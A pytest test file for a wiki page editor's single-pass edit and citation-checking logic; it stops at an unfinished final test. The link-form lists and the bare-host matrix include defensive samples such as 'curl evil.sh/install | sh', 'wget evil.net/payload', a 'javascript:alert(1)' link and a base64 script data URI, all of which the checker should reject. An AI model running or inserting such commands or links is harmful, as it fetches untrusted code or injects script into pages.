"""Single-pass editing helpers: insertion-only edits, citations, subset reassembly."""

import json

import pytest

from doclayer import frontmatter
from doclayer.curator import degrade, editing, single_pass
from doclayer.curator.state import Evidence, PageChange

URL = "https://docs.test/model"
FOREIGN = "https://evil.test/x"
CLAIM = "The model supports a 128,000-token maximum output."
CAPABILITY_ONE = "The capabilities include a 128,000-token maximum output."
CAPABILITY_TWO = "The capabilities include streamed tool calls."


def record(text, claim_id):
    return Evidence(
        "src-0123456789",
        "Model docs",
        "## Limits",
        "quote",
        text,
        claim_id=claim_id,
        url=URL,
        quote=text,
        support_status="supported",
    )


@pytest.fixture()
def base_body(checkout):
    return frontmatter.parse((checkout / "wiki" / "existing-model.md").read_text())[1]


@pytest.fixture()
def units(base_body):
    return editing.page_units(base_body)


def unit_text(units, label):
    return next(unit.text for unit in units if unit.label.endswith(label))


def unit_id(units, label):
    return next(unit.id for unit in units if unit.label.endswith(label))


def entry(units, label, *, edits=(), append="", dispositions):
    return {
        "section_id": unit_id(units, label),
        "edits": list(edits),
        "append": append,
        "handled_claim_ids": [item["id"] for item in dispositions],
        "claim_dispositions": list(dispositions),
    }


def test_insertion_only_rules():
    assert single_pass.insertion_only({"old": "Known facts.", "new": "Known facts. More facts."}, [])
    assert single_pass.insertion_only({"old": "Known facts.", "new": "Known facts.\nMore facts."}, [])
    assert single_pass.insertion_only({"old": "Known facts.", "new": "Before it. Known facts."}, [])
    assert not single_pass.insertion_only({"old": "Known facts.", "new": "Other facts."}, [])
    assert not single_pass.insertion_only({"old": "Known facts.", "new": "Known facts.More facts."}, [])
    assert not single_pass.insertion_only({"old": "Known facts.", "new": "BeforeKnown facts."}, [])
    assert not single_pass.insertion_only({"old": "Known facts.", "new": "Known facts."}, [])
    assert not single_pass.insertion_only({"old": "", "new": "Anything."}, [])
    assert not single_pass.insertion_only({"old": "Known facts.", "new": None}, [])
    wrong = "The maximum output is 64,000 tokens for this model."
    edit = {"old": wrong, "new": "The maximum output is 128,000 tokens for this model."}
    assert not single_pass.insertion_only(edit, [])
    assert not single_pass.insertion_only(edit, [{"claim": "too short"}])
    assert single_pass.insertion_only(edit, [{"claim": "The *maximum output* is 64,000 tokens for this model."}])


def test_replacement_edit_dropped_base_retained(units, base_body):
    records = [record(CAPABILITY_ONE, "c1")]
    added = f"{CAPABILITY_ONE} [source: {URL}]"
    reply = {
        "sections": [
            entry(
                units,
                "Capabilities",
                edits=[{"old": "Known facts.", "new": "Replacement facts."}],
                append=added,
                dispositions=[{"id": "c1", "status": "integrated", "anchor": added}],
            )
        ],
        "notes": [],
    }
    gaps = []
    with degrade.recording(gaps):
        applied = single_pass.apply_reply(units, reply, records, [], page_path="wiki/existing-model.md")
    assert "Replacement facts." not in applied.body
    assert "Known facts." in applied.body and added in applied.body
    assert single_pass.base_text_faults("wiki/existing-model.md", base_body, applied.body, []) == []
    assert [row["kind"] for row in applied.contributions] == ["append"]
    assert applied.contributions[0]["claim_ids"] == ["c1"] and applied.handled == ["c1"]
    assert any("not insertion-only" in note for note in applied.notes)
    assert any("single-pass edit" in gap and degrade.GAP_MARK in gap for gap in gaps)
    # A draft that did drop a base sentence is a blocker naming it.
    faults = single_pass.base_text_faults(
        "wiki/existing-model.md", base_body, base_body.replace("Known facts.", "Replacement facts."), []
    )
    assert len(faults) == 1 and "Known facts." in faults[0].detail and faults[0].severity == "blocker"
    assert (
        single_pass.base_text_faults(
            "wiki/existing-model.md",
            base_body,
            base_body.replace("Known safety notes.", "Safe."),
            [{"claim": "Known safety notes."}],
        )
        != []
    )  # a claim under 25 characters authorizes nothing
    assert (
        single_pass.base_text_faults(
            "wiki/existing-model.md",
            "Known safety notes are listed here.\n",
            "Safe.\n",
            [{"claim": "Known safety notes are listed here."}],
        )
        == []
    )


def test_foreign_citation_flagged():
    records = [record(CLAIM, "c1")]
    assert single_pass.citation_faults(f"{CLAIM} [source: {URL}]", records) is None
    assert single_pass.citation_faults(f"{CLAIM} [Source](<{URL}>)", records) is None
    assert single_pass.citation_faults(f"{CLAIM} [src-0123456789]", records) is None  # hydrated to the evidence URL
    assert single_pass.citation_faults(f"{CLAIM} [source: Model docs]", records) is None
    for text in (
        f"{CLAIM} [source: {FOREIGN}]",
        f"{CLAIM} [Source]({FOREIGN})",
        f"{CLAIM} [source: {URL}] [source: {FOREIGN}]",
        f"{CLAIM} [source: Other docs]",
        f"{CLAIM} [src-aaaaaaaaaa]",
    ):
        assert single_pass.citation_faults(text, records), text
    assert FOREIGN in single_pass.citation_faults(f"{CLAIM} [source: {FOREIGN}]", records)


def test_uncited_contribution_flagged():
    records = [record(CLAIM, "c1")]
    assert "uncited prose" in single_pass.citation_faults(CLAIM, records)
    assert single_pass.citation_faults(f"- {CLAIM} [source: {URL}]\n- Streams tool calls.", records)
    assert (
        single_pass.citation_faults(f"- {CLAIM} [source: {URL}]\n- Streams tool calls. [source: {URL}]", records)
        is None
    )
    assert single_pass.citation_faults(f"```\nprint(1)\n```\n\n{CLAIM} [source: {URL}]", records) is None


def test_reassemble_subset_keeps_base_bytes(units, base_body):
    records = [record(CAPABILITY_ONE, "c1"), record(CAPABILITY_TWO, "c2")]
    first = f"Known facts. {CAPABILITY_ONE} [source: {URL}]"
    second = f"{CAPABILITY_TWO} [source: {URL}]"
    reply = {
        "sections": [
            entry(
                units,
                "Capabilities",
                edits=[{"old": "Known facts.", "new": first}],
                append=second,
                dispositions=[
                    {"id": "c1", "status": "integrated", "anchor": f"{CAPABILITY_ONE} [source: {URL}]"},
                    {"id": "c2", "status": "integrated", "anchor": second},
                ],
            )
        ],
        "notes": [],
    }
    page = "wiki/existing-model.md"
    full = single_pass.apply_reply(units, reply, records, [], page_path=page)
    assert [(row["id"], row["kind"], row["claim_ids"]) for row in full.contributions] == [
        ("k1", "edit", ["c1"]),
        ("k2", "append", ["c2"]),
    ]
    assert full.contributions[0]["text"] == f"{CAPABILITY_ONE} [source: {URL}]"
    assert full.contributions[1]["text"] == second
    assert first in full.body and second in full.body and full.not_integrated == {}

    only_append = single_pass.reassemble(units, reply, {"k2"}, records, [], page_path=page)
    assert second in only_append.body and CAPABILITY_ONE not in only_append.body
    assert "Known facts." in only_append.body
    assert [row["id"] for row in only_append.contributions] == ["k2"]
    assert only_append.handled == ["c2"] and set(only_append.not_integrated) == {"c1"}
    assert only_append.not_integrated["c1"]["reason"] == "contribution dropped"

    only_edit = single_pass.reassemble(units, reply, {"k1"}, records, [], page_path=page)
    assert first in only_edit.body and CAPABILITY_TWO not in only_edit.body
    assert only_edit.handled == ["c1"] and set(only_edit.not_integrated) == {"c2"}

    nothing = single_pass.reassemble(units, reply, set(), records, [], page_path=page)
    assert nothing.body == base_body and nothing.contributions == [] and nothing.handled == []
    assert set(nothing.not_integrated) == {"c1", "c2"}
    both = single_pass.reassemble(units, reply, {"k1", "k2"}, records, [], page_path=page)
    assert both.body == full.body
    assert [unit.text for unit in units] == [unit.text for unit in editing.page_units(base_body)]  # base never mutated


def test_section_reply_rejected_degrades_only_that_section(units, base_body):
    records = [record(CLAIM, "c-root"), record(CAPABILITY_ONE, "c-cap")]
    routes = single_pass.route_records(units, records)
    assert [row for row in routes[unit_id(units, "Capabilities")]] == [records[1]]
    assert routes[units[0].id] == [records[0]]
    good = f"{CAPABILITY_ONE} [source: {URL}]"
    reply = {
        "sections": [
            {
                "section_id": units[0].id,
                "edits": [],
                "append": CLAIM,
                "handled_claim_ids": ["not-a-claim"],
                "claim_dispositions": [{"id": "not-a-claim", "status": "integrated", "anchor": CLAIM}],
            },
            entry(
                units,
                "Capabilities",
                append=good,
                dispositions=[{"id": "c-cap", "status": "integrated", "anchor": good}],
            ),
        ],
        "notes": [],
    }
    gaps = []
    with degrade.recording(gaps):
        applied = single_pass.apply_reply(units, reply, records, [], page_path="wiki/existing-model.md")
    assert good in applied.body and CLAIM not in applied.body
    assert applied.body.startswith(units[0].text)
    assert applied.handled == ["c-cap"]
    assert set(applied.not_integrated) == {"c-root"} and applied.not_integrated["c-root"]["section_id"] == units[0].id
    assert len(gaps) == 1 and f"single-pass section edit {units[0].id}" in gaps[0]
    # Without a job to record the gap, a rejected reply is never dropped silently.
    with pytest.raises(editing.ModelError):
        single_pass.apply_reply(units, reply, records, [], page_path="wiki/existing-model.md")


def test_draft_request_fits_budget_and_reports_omitted(units):
    change = PageChange("g", "wiki/existing-model.md", "update", title="Existing model")
    records = [
        Evidence(
            "src-0123456789",
            "Model docs",
            "## Limits",
            "quote",
            f"The model capability number {number} supports a documented limit.",
            claim_id=f"c{number}",
            url=URL,
            quote="Verbatim source support. " * 40,
            support_status="supported",
        )
        for number in range(12)
    ]
    system, user, kept, omitted = single_pass.draft_request(
        "Import the model docs", change, {"title": "Existing model"}, units, records, [], char_budget=9000
    )
    assert len(system) + len(user) + single_pass.REPLY_RESERVE <= 9000
    assert system.startswith("You are the single-pass page editor of a personal wiki.")
    assert editing.SUBJECT_CONTENT_POLICY in system and editing.HEADING_APPEND_RULE in system
    assert omitted and kept and [r.claim_id for r in kept] + omitted == [r.claim_id for r in records]
    assert omitted == [r.claim_id for r in records][len(kept) :]  # the lowest-ranked go first
    assert user.startswith("SINGLE-PASS PAGE EDIT\n")
    frame = json.loads(user.split("\n", 1)[1])
    assert frame["page"]["path"] == "wiki/existing-model.md"
    assert frame["claim_ids"] == [r.claim_id for r in kept]
    assert {row["id"] for row in frame["evidence"]} == set(frame["claim_ids"])
    assert set(frame["evidence"][0]) == {"id", "url", "claim", "quote"}
    assert {identity for row in frame["sections"] for identity in row["claim_ids"]} == set(frame["claim_ids"])
    assert frame["contract"]["reply"] and frame["corrections"] == []
    # Everything fits: nothing is omitted.
    _, whole, kept_all, none = single_pass.draft_request(
        "Import the model docs", change, {}, units, records[:2], [], char_budget=20000
    )
    assert none == [] and len(kept_all) == 2 and json.loads(whole.split("\n", 1)[1])["outline"].count("\n") == 2
    # The binding follows the base blob, the evidence and the corrections.
    change.base_blob = "blob-1"
    binding = single_pass.request_binding("topic", change, records, [])
    assert binding == single_pass.request_binding("topic", change, list(records), [])
    change.base_blob = "blob-2"
    assert binding != single_pass.request_binding("topic", change, records, [])
    change.base_blob = "blob-1"
    assert binding != single_pass.request_binding("topic", change, records[:-1], [])
    assert binding != single_pass.request_binding("topic", change, records, [{"claim": "x"}])
    assert binding != single_pass.request_binding("other topic", change, records, [])


PAGE = "wiki/existing-model.md"
PAIR_A = f"{CAPABILITY_ONE} [source: {URL}]"
PAIR_B = f"{CAPABILITY_TWO} [source: {URL}]"


@pytest.mark.parametrize("separator", ["\n\n", "\n  \n", "\n\t\n\n"])
def test_partial_claim_append_keeps_published_paragraph_attributed(units, base_body, separator):
    """apply_edits publishes a rewritten append when only some claims are proven;
    the paragraph that landed must be a contribution, never untracked body text."""
    records = [record(CAPABILITY_ONE, "c1"), record(CAPABILITY_TWO, "c2")]
    reply = {
        "sections": [
            entry(
                units,
                "Capabilities",
                append=PAIR_A + separator + PAIR_B,
                dispositions=[
                    {"id": "c1", "status": "integrated", "anchor": PAIR_A},
                    {"id": "c2", "status": "integrated", "anchor": "An anchor the section never contains."},
                ],
            )
        ],
        "notes": [],
    }
    applied = single_pass.apply_reply(units, reply, records, [], page_path=PAGE)
    assert PAIR_A in applied.body and PAIR_B not in applied.body
    assert [(row["kind"], row["text"], row["claim_ids"]) for row in applied.contributions] == [
        ("append", PAIR_A, ["c1"])
    ]
    assert applied.handled == ["c1"] and set(applied.not_integrated) == {"c2"}
    # Every character the body gained over the base is inside a contribution.
    assert applied.body.replace(PAIR_A, "").split() == base_body.split()


def test_unattributable_added_text_degrades_the_section(units, base_body, monkeypatch):
    records = [record(CAPABILITY_ONE, "c1"), record(CLAIM, "c-root")]
    real = editing.apply_edits

    def sneaky(unit, entry, *args, **kwargs):
        return real(unit, entry, *args, **kwargs) + "Smuggled sentence with no citation.\n"

    monkeypatch.setattr(editing, "apply_edits", sneaky)
    reply = {
        "sections": [
            entry(
                units,
                "Capabilities",
                append=PAIR_A,
                dispositions=[{"id": "c1", "status": "integrated", "anchor": PAIR_A}],
            )
        ],
        "notes": [],
    }
    gaps = []
    with degrade.recording(gaps):
        applied = single_pass.apply_reply(units, reply, records, [], page_path=PAGE)
    assert applied.body == base_body and applied.contributions == [] and applied.handled == []
    assert applied.not_integrated["c1"]["section_id"] == unit_id(units, "Capabilities")
    assert len(gaps) == 1 and "cannot be attributed" in gaps[0]


LINK_FORMS = [
    "[x](//evil.test/x)",
    "[y](ftp://evil.test/x)",
    "https://evil.test/x",
    "<https://evil.test/x>",
    '<a href="https://evil.test">x</a>',
    "<a href='//evil.test/x'>x</a>",
    '<img src="https://evil.test/p.png">',
    '[x](https://evil.test/x "title")',
    "[x](<https://evil.test/x>)",
    "[x](javascript:alert(1))",
    "[x](relative/page.md)",
    "[x](#anchor)",
    "![x](https://evil.test/p.png)",
    "//evil.test/x",
    "ftp://evil.test/x",
    "[a [b]](https://evil.test/x)",
    "[ref]: https://evil.test/x",
    "[source: ftp://evil.test/x]",
    "[source: //evil.test/x]",
    "<mailto:a@evil.test>",
]


@pytest.mark.parametrize("form", LINK_FORMS)
def test_every_url_form_outside_the_evidence_is_a_fault(form):
    records = [record(CLAIM, "c1")]
    assert single_pass.citation_faults(f"{CLAIM} [source: {URL}]", records) is None
    assert single_pass.citation_faults(f"{CLAIM} [source: {URL}] {form}", records), form
    assert single_pass.citation_faults(f"{CLAIM} [source: {URL}]\n\n{form}", records), form


@pytest.mark.parametrize(
    "text",
    [
        f"{CLAIM} [source: {URL}].",
        f"{CLAIM} (see [docs]({URL}))",
        f"{CLAIM} <{URL}> [source: {URL}]",
        f"{CLAIM} **{URL}** [source: {URL}]",
        f'{CLAIM} <a href="{URL}">docs</a> [source: {URL}]',
        f"{CLAIM} [source: {URL}], and more",
    ],
)
def test_allowed_url_forms_pass(text):
    assert single_pass.citation_faults(text, [record(CLAIM, "c1")]) is None, text


def test_duplicate_noop_and_gap_recording_rules(units, base_body):
    """A no-op edit drops silently; a replacement drops with a gap inside recording."""
    records = [record(CAPABILITY_ONE, "c1")]
    corrections = [{"claim": "Known facts are listed in this section."}]
    for old, corrected in (("Known facts.", []), ("Known facts.", [{"claim": "Known facts."}])):
        reply = {
            "sections": [
                entry(
                    units,
                    "Capabilities",
                    edits=[{"old": old, "new": old}],
                    append=PAIR_A,
                    dispositions=[{"id": "c1", "status": "integrated", "anchor": PAIR_A}],
                )
            ],
            "notes": [],
        }
        gaps = []
        with degrade.recording(gaps):
            applied = single_pass.apply_reply(units, reply, records, corrected, page_path=PAGE)
        assert gaps == [] and applied.notes == [] and PAIR_A in applied.body
        assert [row["kind"] for row in applied.contributions] == ["append"]
    # A no-op whose old holds a corrected claim (25+ characters) is dropped the same way.
    long_old = "Known facts are listed in this section."
    noop_units = editing.page_units(base_body.replace("Known facts.", long_old))
    reply = {
        "sections": [
            entry(
                noop_units,
                "Capabilities",
                edits=[{"old": long_old, "new": long_old}],
                append=PAIR_A,
                dispositions=[{"id": "c1", "status": "integrated", "anchor": PAIR_A}],
            )
        ],
        "notes": [],
    }
    gaps = []
    with degrade.recording(gaps):
        applied = single_pass.apply_reply(noop_units, reply, records, corrections, page_path=PAGE)
    assert gaps == [] and applied.notes == [] and PAIR_A in applied.body
    # Inside recording, a dropped replacement records its gap exactly once.
    replacement = {
        "sections": [
            entry(
                units,
                "Capabilities",
                edits=[{"old": "Known facts.", "new": "Other facts."}],
                append=PAIR_A,
                dispositions=[{"id": "c1", "status": "integrated", "anchor": PAIR_A}],
            )
        ],
        "notes": [],
    }
    gaps = []
    with degrade.recording(gaps):
        single_pass.apply_reply(units, replacement, records, [], page_path=PAGE)
        single_pass.apply_reply(units, replacement, records, [], page_path=PAGE)
    assert len(gaps) == 1 and degrade.GAP_MARK in gaps[0] and "single-pass edit" in gaps[0]


def test_base_text_faults_count_duplicate_sentences():
    base = "Same line.\n\nSame line.\n\nOther line.\n"
    assert single_pass.base_text_faults(PAGE, base, base, []) == []
    one_lost = single_pass.base_text_faults(PAGE, base, "Same line.\n\nOther line.\n", [])
    assert len(one_lost) == 1 and 'sentence: "Same line."' in one_lost[0].detail
    both_lost = single_pass.base_text_faults(PAGE, base, "Other line.\n", [])
    assert len(both_lost) == 2
    # A mid-sentence insertion names the base sentence it split.
    split = single_pass.base_text_faults(PAGE, "The limit is 5 tokens.\n", "The limit is 5 extra words tokens.\n", [])
    assert len(split) == 1 and 'sentence: "The limit is 5 tokens."' in split[0].detail


def test_draft_request_signals_nothing_fits(units):
    change = PageChange("g", PAGE, "update", title="Existing model")
    records = [
        Evidence(
            "src-0123456789",
            "Model docs",
            "## Limits",
            "quote",
            f"Capability {number} is documented.",
            claim_id=f"c{number}",
            url=URL,
            quote="Verbatim source support. " * 40,
            support_status="supported",
        )
        for number in range(3)
    ]
    with pytest.raises(single_pass.DraftTooLarge) as caught:
        single_pass.draft_request("Import", change, {}, units, records, [], char_budget=3000)
    assert caught.value.omitted == ["c0", "c1", "c2"]
    assert isinstance(caught.value, editing.ModelError) and degrade.droppable(caught.value)
    gaps = []
    with degrade.recording(gaps):
        degrade.degrade_unit(f"{PAGE}: single-pass draft", caught.value)
    assert len(gaps) == 1
    # No records is not an overflow.
    _, _, kept, omitted = single_pass.draft_request("Import", change, {}, units, [], [], char_budget=20000)
    assert kept == [] and omitted == []


def test_draft_request_builds_views_once_per_section(units, monkeypatch):
    change = PageChange("g", PAGE, "update", title="Existing model")
    records = [
        Evidence(
            "src-0123456789",
            "Model docs",
            "## Limits",
            "quote",
            f"The model capability number {number} supports a documented limit.",
            claim_id=f"c{number}",
            url=URL,
            quote="Verbatim source support. " * 40,
            support_status="supported",
        )
        for number in range(40)
    ]
    calls = []
    real = editing.views
    monkeypatch.setattr(editing, "views", lambda *args, **kwargs: calls.append(1) or real(*args, **kwargs))
    _, user, _kept, omitted = single_pass.draft_request("Import", change, {}, units, records, [], char_budget=9000)
    assert omitted and len(calls) <= 3 * len(units)  # not once per shed record
    assert len(single_pass.DRAFT_SYSTEM) + len(user) + single_pass.REPLY_RESERVE <= 9000


def test_unrouted_record_falls_back_to_the_first_level_one_unit():
    body = "A preamble before any heading.\n\n# Title\n\n## Section\n\nText about widgets.\n"
    preamble_units = editing.page_units(body)
    assert preamble_units[0].level == 0
    stray = record("Zebras gallop quickly.", "c9")
    routed = single_pass.route_records(preamble_units, [stray])
    root = next(unit for unit in preamble_units if unit.level == 1)
    assert routed == {root.id: [stray]}


def test_reassemble_keeps_claimless_contribution_only_when_cited(units, base_body):
    records = [record("Known facts.", "c1")]
    present = {"id": "c1", "status": "already_present", "anchor": "Known facts."}
    cited = {
        "sections": [
            entry(
                units,
                "Capabilities",
                edits=[{"old": "Known facts.", "new": f"Known facts. [source: {URL}]"}],
                dispositions=[present],
            )
        ],
        "notes": [],
    }
    full = single_pass.apply_reply(units, cited, records, [], page_path=PAGE)
    assert [(row["id"], row["claim_ids"], row["text"]) for row in full.contributions] == [
        ("k1", [], f"[source: {URL}]")
    ]
    gaps = []
    with degrade.recording(gaps):
        kept = single_pass.reassemble(units, cited, {"k1"}, records, [], page_path=PAGE)
    assert kept.body == full.body and [row["id"] for row in kept.contributions] == ["k1"] and gaps == []

    uncited = {
        "sections": [
            entry(
                units,
                "Capabilities",
                edits=[{"old": "Known facts.", "new": "Known facts. Extra words."}],
                dispositions=[present],
            )
        ],
        "notes": [],
    }
    full = single_pass.apply_reply(units, uncited, records, [], page_path=PAGE)
    assert [row["claim_ids"] for row in full.contributions] == [[]]
    gaps = []
    with degrade.recording(gaps):
        left_out = single_pass.reassemble(units, uncited, {"k1"}, records, [], page_path=PAGE)
    assert left_out.body == base_body and left_out.contributions == []
    assert len(gaps) == 1 and "k1" in gaps[0] and "not cited" in gaps[0]
    with pytest.raises(editing.ModelError):  # nowhere to record the gap: never silent
        single_pass.reassemble(units, uncited, {"k1"}, records, [], page_path=PAGE)


SCHEMELESS_FORMS = [
    "www.evil.test/x",
    "see www.evil.test.",
    "evil.test/x",
    "docs.evil.test/path/to?q=1",
    "(evil.test/x)",
    "data:text/html;base64,PHNjcmlwdD4=",
    "data:,hello",
    "DATA:image/png;base64,AAAA",
]


@pytest.mark.parametrize("form", SCHEMELESS_FORMS)
def test_schemeless_url_outside_the_evidence_is_a_fault(form):
    records = [record(CLAIM, "c1")]
    assert single_pass.citation_faults(f"{CLAIM} {form} [source: {URL}]", records), form


@pytest.mark.parametrize(
    "text",
    [
        f"{CLAIM} See docs.test/model for details. [source: {URL}]",
        f"{CLAIM} It is listed at www.docs.test/model. [source: https://www.docs.test/model]",
        f"{CLAIM} This holds, e.g. for v1.2.3 and i.e. 2.5.1 builds. [source: {URL}]",
        f"{CLAIM} Set metadata: true and use Node.js 20.1 with config.yaml. [source: {URL}]",
        f"{CLAIM} Read and/or write the file a.b. [source: {URL}]",
    ],
)
def test_schemeless_evidence_url_and_ordinary_prose_pass(text):
    records = [
        record(CLAIM, "c1"),
        Evidence(
            "src-0123456789",
            "Model docs",
            "## Limits",
            "quote",
            CLAIM,
            claim_id="c2",
            url="https://www.docs.test/model",
            quote=CLAIM,
        ),
    ]
    assert single_pass.citation_faults(text, records) is None, text


API = "https://api.docs.test/v1/messages"


def quoted_record():
    quote = f"Send a POST request to {API} with the model name."
    return Evidence(
        "src-0123456789",
        "Model docs",
        "## Limits",
        "quote",
        "Requests go to the messages endpoint.",
        claim_id="c1",
        url=URL,
        quote=quote,
        support_status="supported",
    )


@pytest.mark.parametrize(
    "text",
    [
        f"Requests go to the messages endpoint. [source: {URL}]\n\n```\ncurl {API}\n```",
        f"Requests go to the messages endpoint `{API}`. [source: {URL}]",
        f'Requests go to the messages endpoint. [source: {URL}]\n\n~~~bash\ncurl -X POST "{URL}"\n~~~',
    ],
)
def test_code_url_quoted_by_the_evidence_or_an_evidence_url_passes(text):
    assert single_pass.citation_faults(text, [quoted_record()]) is None, text


@pytest.mark.parametrize(
    "text",
    [
        f"Requests go to the messages endpoint. [source: {URL}]\n\n```\ncurl https://api.evil.test/v1\n```",
        f"Requests go to the messages endpoint `https://api.evil.test/v1`. [source: {URL}]",
        f"Requests go to the messages endpoint. [source: {URL}]\n\n```\ncurl http://localhost:8080/v1\n```",
        f"Requests go to the messages endpoint {API}. [source: {URL}]",  # quoted URL in prose is not exempt
    ],
)
def test_code_url_outside_the_evidence_text_is_a_fault(text):
    assert single_pass.citation_faults(text, [quoted_record()]), text


def test_append_to_a_middle_section_keeps_the_blank_line_before_the_next_heading(units, base_body):
    records = [record(CAPABILITY_ONE, "c1")]
    sentence = f"{CAPABILITY_ONE} [source: {URL}]"
    reply = {
        "sections": [
            entry(
                units,
                "Capabilities",
                append=sentence,
                dispositions=[{"id": "c1", "status": "integrated", "anchor": sentence}],
            )
        ],
        "notes": [],
    }
    with degrade.recording([]):
        applied = single_pass.apply_reply(units, reply, records, [], page_path="wiki/existing-model.md")
    assert f"{sentence}\n\n## Safety" in applied.body
    assert applied.body.replace(sentence + "\n\n", "", 1) == base_body


SCHEMELESS_PROSE_PASSES = [
    f"{CLAIM} Works with Vue.js/React stacks. [source: {URL}]",
    f"{CLAIM} Use ASP.NET/Core hosting. [source: {URL}]",
    f"{CLAIM} Pair node.js/express or main.py/utils modules. [source: {URL}]",
]


@pytest.mark.parametrize("text", SCHEMELESS_PROSE_PASSES)
def test_tech_names_with_slashes_are_not_urls(text):
    assert single_pass.citation_faults(text, [record(CLAIM, "c1")]) is None, text


@pytest.mark.parametrize(
    "form",
    [
        "mailto:a@evil.test",
        "MAILTO:a@evil.test?subject=x",
        "evil.test:8080/x",
        "api.evil.test:443",
        "localhost:8080/admin",
    ],
)
def test_mailto_and_host_port_outside_the_evidence_are_faults(form):
    assert single_pass.citation_faults(f"{CLAIM} Mail {form} now. [source: {URL}]", [record(CLAIM, "c1")]), form


def test_mailto_and_host_port_evidence_pass():
    records = [
        record(CLAIM, "c1"),
        Evidence(
            "src-0123456789",
            "Model docs",
            "## L",
            "quote",
            CLAIM,
            claim_id="c2",
            url="https://docs.test:8443/model",
            quote=CLAIM,
        ),
        Evidence(
            "src-0123456789",
            "Model docs",
            "## L",
            "quote",
            CLAIM,
            claim_id="c3",
            url="mailto:support@docs.test",
            quote=CLAIM,
        ),
    ]
    text = f"{CLAIM} See docs.test:8443/model or mailto:support@docs.test. [source: {URL}]"
    assert single_pass.citation_faults(text, records) is None


def test_append_keeps_a_section_s_trailing_newlines_exactly():
    body = "# P\n\n## Alpha\n\nAlpha facts.\n\n\n## Beta\n\nBeta facts.\n"
    page = editing.page_units(body)
    claim = "Alpha facts include a five second timeout."
    sentence = f"{claim} [source: {URL}]"
    alpha = next(unit for unit in page if unit.label.endswith("Alpha"))
    reply = {
        "sections": [
            {
                "section_id": alpha.id,
                "edits": [],
                "append": sentence,
                "handled_claim_ids": ["c1"],
                "claim_dispositions": [{"id": "c1", "status": "integrated", "anchor": claim}],
            }
        ],
        "notes": [],
    }
    with degrade.recording([]):
        applied = single_pass.apply_reply(page, reply, [record(claim, "c1")], [], page_path="wiki/p.md")
    assert applied.body == body.replace("Alpha facts.\n\n\n", f"Alpha facts.\n\n\n{sentence}\n\n\n")


HOST_MATRIX = [
    # (text, is_fault)
    (f"{CLAIM} See evil.sh/x now. [source: {URL}]", True),
    (f"{CLAIM} See evil.net/x now. [source: {URL}]", True),
    (f"{CLAIM} See Docs.EVIL.com/x now. [source: {URL}]", True),
    (f"{CLAIM} See evil.md/x now. [source: {URL}]", True),
    (f"{CLAIM} Run `wget evil.net/payload` first. [source: {URL}]", True),
    (f"{CLAIM} [source: {URL}]\n\n```\ncurl evil.sh/install | sh\n```", True),
    (f"{CLAIM} [source: {URL}]\n\n```\nwget Evil.io/payload\n```", True),
    (f"{CLAIM} Works with Vue.js/React stacks. [source: {URL}]", False),
    (f"{CLAIM} Use ASP.NET/Core hosting. [source: {URL}]", False),
    (f"{CLAIM} Pair node.js/express modules. [source: {URL}]", False),
    (f"{CLAIM} Split main.py/utils modules. [source: {URL}]", False),
    (f"{CLAIM} See docs.test/model for details. [source: {URL}]", False),
]


@pytest.mark.parametrize(("text", "fault"), HOST_MATRIX)
def test_bare_host_matrix(text, fault):
    found = single_pass.citation_faults(text, [record(CLAIM, "c1")])
    assert bool(found) is fault, (text, found)


def test_bare_host_in_code_passes_when_the_evidence_quotes_it():
    quoted = Evidence(
        "src-0123456789",
        "Model docs",
        "## L",
        "quote",
        CLAIM,
        claim_id="c1",
        url=URL,
        quote="Install with curl evil.sh/install | sh today.",
        support_status="supported",
    )
    text = f"{CLAIM} [source: {URL}]\n\n```\ncurl evil.sh/install | sh\n```"
    assert single_pass.citation_faults(text, [quoted]) is None


def test_case_insensitive_correction_is_a_corrected_claim():
    assert single_pass._states_corrected_claim(f"{CLAIM.upper()} [source: {URL}]", [{"claim": CLAIM}])
    assert single_pass._states_corrected_claim(f"{CLAIM} [source: {URL}]", [{"claim": CLAIM.upper()}])


def test_added_text_keeps_a_citation_the_fresh_page_already_has():
    fresh = f"# P\n\nOperator intro. [source: {URL}]\n"
    body = f"# P\n\nOperator intro. [source: {URL}]\n\n{CLAIM} [source: {URL}]\n"
    (added,) = single_pass.added_text(fresh, body)
    assert URL in added and single_pass.citation_faults(added, [record(CLAIM, "c1")]) is None


def test_bare_email_and_zero_width_hosts_are_faults():
    records = [record(CLAIM, "c1")]
    cited = f"{CLAIM} [source: {URL}]"
    for extra in ("Contact a@evil.net for access.", "See www.evil​.test/x for more.", "See evil⁠.com/x for more."):
        assert single_pass.citation_faults(f"{cited} {extra}", records), extra


def test_email_quoted_in_evidence_passes():
    text = "Write to support@docs.test for quota increases."
    records = [record(text, "c1")]
    assert single_pass.citation_faults(f"{text} [source: {URL}]", records) is None


def test_append_before_a_heading_with_no_blank_line_adds_one():
    body = "# P\n\n## Alpha\n\n* Alpha facts.\n## Beta\n\nBeta facts.\n"
    page = editing.page_units(body)
    claim = "Alpha facts include a five second timeout."
    sentence = f"{claim} [source: {URL}]"
    alpha = next(unit for unit in page if unit.label.endswith("Alpha"))
    reply = {
        "sections": [
            {
                "section_id": alpha.id,
                "edits": [],
                "append": sentence,
                "handled_claim_ids": ["c1"],
                "claim_dispositions": [{"id": "c1", "status": "integrated", "anchor": claim}],
            }
        ],
        "notes": [],
    }
    with degrade.recording([]):
        applied = single_pass.apply_reply(page, reply, [record(claim, "c1")], [], page_path="wiki/p.md")
    assert f"{sentence}\n\n## Beta" in applied.body
    assert applied.contributions and not applied.not_integrated


def test_grounding_prompt_rejects_absence_from_a_list():
    assert "missing from a list in the evidence does not support it" in single_pass.GROUND_SYSTEM


def test_claim_the_reply_files_under_another_framed_section_is_rehomed(units, base_body):
    """The router's keyword guess is a hint: a claim the model integrates under a
    different section of the same frame belongs there (live job-e04876a6a1)."""
    records = [record(CLAIM, "c-root"), record(CAPABILITY_ONE, "c-cap")]
    assert single_pass.route_records(units, records)[units[0].id] == [records[0]]
    both = f"{CLAIM} [source: {URL}] {CAPABILITY_ONE} [source: {URL}]"
    reply = {
        "sections": [
            entry(
                units,
                "Capabilities",
                append=both,
                dispositions=[
                    {"id": "c-root", "status": "integrated", "anchor": f"{CLAIM} [source: {URL}]"},
                    {"id": "c-cap", "status": "integrated", "anchor": f"{CAPABILITY_ONE} [source: {URL}]"},
                ],
            )
        ],
        "notes": [],
    }
    gaps = []
    with degrade.recording(gaps):
        applied = single_pass.apply_reply(units, reply, records, [], page_path="wiki/existing-model.md")
    assert gaps == [] and applied.handled == ["c-cap", "c-root"] and applied.not_integrated == {}
    assert both in applied.body and applied.body.startswith(units[0].text)


def test_claims_swapped_between_framed_sections_are_both_kept(units, base_body):
